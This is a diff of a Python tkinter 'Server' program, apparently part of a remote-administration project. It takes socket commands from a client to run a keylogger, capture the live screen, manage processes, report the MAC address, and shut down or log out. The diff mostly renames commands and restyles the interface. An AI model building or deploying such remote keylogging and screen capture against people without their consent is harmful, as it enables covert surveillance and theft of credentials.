@@ -1,22 +1,20 @@
 import tkinter as tk
 import socket, pickle, PIL.ImageGrab, struct, uuid
-import os, json, re, winreg, threading, subprocess
-import numpy as np
-from pynput.keyboard import Listener
+import socket, uuid
+import os
 import keylogger_server as kl 
+import app_process_server as ap
 import directory_tree_server as dt
 
 main = tk.Tk()
 main.geometry("200x200")
 main.title("Server")
+main['bg'] = 'plum1'
 
 #Global variables
-###############################################################################
 global client
 BUFSIZ = 1024 * 4
-WIDTH = 1900
-HEIGHT = 1000
-###############################################################################
+
 def keylogger():
     global client
     kl.keylog(client)
@@ -36,6 +34,8 @@ def mac_address():
     return
 
 def app_process():
+    global client
+    ap.app_process(client)
     return
 
 def live_screen():
@@ -94,11 +94,11 @@ def Connect():
         msg = client.recv(BUFSIZ).decode("utf8")
         if "KEYLOG" in msg:
             keylogger()
-        elif "SHUTDOWN" in msg:
+        elif "SD_LO" in msg:
             shutdown_logout()
         elif "LIVESCREEN" in msg:
             live_screen()
-        elif "PROCESS" in msg:
+        elif "APP_PRO" in msg:
             app_process()
         elif "MAC" in msg:
             mac_address()
@@ -110,8 +110,8 @@ def Connect():
             return
 ###############################################################################    
 
-tk.Button(main, text = "Open", command = Connect).place(x = 100, y = 100, anchor = "center")
-
+tk.Button(main, text = "OPEN", width = 10, height = 2, fg = 'white', bg = 'IndianRed3', borderwidth=0,
+            highlightthickness=0, command = Connect, relief="flat").place(x = 100, y = 100, anchor = "center")
 main.mainloop()
 
 
